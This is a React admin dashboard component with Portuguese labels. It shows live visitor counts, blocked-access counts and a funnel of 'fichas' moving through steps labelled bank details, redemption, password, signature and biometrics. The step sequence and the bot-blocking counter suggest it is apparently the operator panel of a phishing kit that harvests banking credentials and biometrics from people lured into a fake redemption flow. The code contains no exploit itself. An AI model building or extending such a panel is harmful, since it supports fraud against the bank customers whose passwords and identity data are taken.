import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { leadRepository, sessionRepository, configRepository } from "@/repositories";

interface Stats {
  totalLeads: number;
  onlineNow: number;
  completed: number;
  inProgress: number;
  totalSessions: number;
  totalBlocked: number;
  byStep: Record<string, number>;
}

interface StatCard {
  label: string;
  value: number;
  iconSrc: string;
  accentClass: string;
  pulse?: boolean;
  sub?: { label: string; value: number; color: string }[];
}

const STEP_LABELS: Record<string, string> = {
  splash: "Splash",
  inicio: "Início",
  "dados-bancarios": "Dados Bancários",
  resgate: "Resgate",
  senha: "Senha",
  assinatura: "Assinatura",
  biometria: "Biometria",
  concluido: "Concluído",
};

export default function AdminDashboard() {
  const [stats, setStats] = useState<Stats>({
    totalLeads: 0,
    onlineNow: 0,
    completed: 0,
    inProgress: 0,
    totalSessions: 0,
    totalBlocked: 0,
    byStep: {},
  });

  const fetchStats = async () => {
    try {
      const [total, completed, blocked, sessions] = await Promise.all([
        leadRepository.countAll(),
        leadRepository.countByStatus("concluido"),
        configRepository.countAccessLogs(),
        sessionRepository.countStats(),
      ]);

      // Isolated: RPC may not exist if migration hasn't been applied yet
      let byStep: Record<string, number> = {};
      try {
        byStep = await leadRepository.getStepCounts();
      } catch (e) {
        console.warn("getStepCounts RPC unavailable:", e);
      }

      setStats({
        totalLeads: total,
        onlineNow: sessions.online,
        completed,
        inProgress: total - completed,
        totalSessions: sessions.total,
        totalBlocked: blocked,
        byStep,
      });
    } catch (err) {
      console.error("fetchStats error:", err);
    }
  };

  useEffect(() => {
    fetchStats();

    // Polling fallback: updates every 30s even if Realtime disconnects
    const interval = setInterval(fetchStats, 30_000);

    const channel = supabase
      .channel("admin-dashboard")
      .on("postgres_changes", { event: "*", schema: "public", table: "leads" }, fetchStats)
      .on("postgres_changes", { event: "*", schema: "public", table: "site_sessions" }, fetchStats)
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, []);

  const cards: StatCard[] = [
    {
      label: "Visitantes Online",
      value: stats.onlineNow,
      iconSrc: "/icones/visitantes.png",
      accentClass: "border-emerald-400",
      pulse: true,
    },
    {
      label: "Total de Acessos",
      value: stats.totalSessions,
      iconSrc: "/icones/acessos.png",
      accentClass: "border-blue-400",
    },
    {
      label: "Acessos Bloqueados",
      value: stats.totalBlocked,
      iconSrc: "/icones/robo.png",
      accentClass: "border-destructive",
    },
    {
      label: "Total de Fichas",
      value: stats.totalLeads,
      iconSrc: "/icones/fichas.png",
      accentClass: "border-primary",
      sub: [
        { label: "Completas", value: stats.completed, color: "text-emerald-400" },
        { label: "Incompletas", value: stats.inProgress, color: "text-orange-400" },
      ],
    },
  ];

  return (
    <div className="space-y-6">
      <h1 className="text-xl font-bold text-foreground font-mono tracking-tight">// Dashboard</h1>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {cards.map((c) => (
          <div
            key={c.label}
            className={`rounded-xl bg-card border border-border border-l-4 p-5 shadow-sm ${c.accentClass}`}
          >
            <div className="flex items-center justify-between mb-3">
              <span className="font-mono text-[10px] tracking-[0.15em] text-muted-foreground uppercase">
                {c.label}
              </span>
              <div className="relative">
                <img src={c.iconSrc} alt={c.label} className="h-6 w-6 object-contain" />
                {c.pulse && (
                  <span className="absolute -top-0.5 -right-0.5 flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-400" />
                  </span>
                )}
              </div>
            </div>
            <p className="text-3xl font-bold text-foreground font-mono tracking-tight">{c.value}</p>
            {c.sub && (
              <div className="flex gap-3 mt-2">
                {c.sub.map((s) => (
                  <span key={s.label} className="text-[11px] font-mono">
                    <span className={`font-bold ${s.color}`}>{s.value}</span>
                    <span className="text-muted-foreground ml-1">{s.label}</span>
                  </span>
                ))}
              </div>
            )}
          </div>
        ))}
      </div>

      <div className="rounded-xl bg-card border border-border p-5 shadow-sm">
        <div className="flex items-center gap-3 mb-5">
          <span className="font-mono text-[10px] tracking-[0.2em] text-muted-foreground uppercase">Funil por Etapa</span>
          <div className="flex-1 h-px bg-border" />
        </div>
        <div className="space-y-3">
          {Object.entries(STEP_LABELS).map(([key, label]) => {
            const count = stats.byStep[key] ?? 0;
            const pct = stats.totalLeads > 0 ? (count / stats.totalLeads) * 100 : 0;
            return (
              <div key={key} className="flex items-center gap-3">
                <span className="w-32 text-xs text-muted-foreground truncate font-mono">{label}</span>
                <div className="flex-1 h-5 bg-muted rounded overflow-hidden">
                  <div
                    className="h-full bg-primary/70 rounded transition-all duration-500"
                    style={{ width: `${pct}%` }}
                  />
                </div>
                <span className="w-8 text-right text-xs font-bold font-mono text-foreground">{count}</span>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}
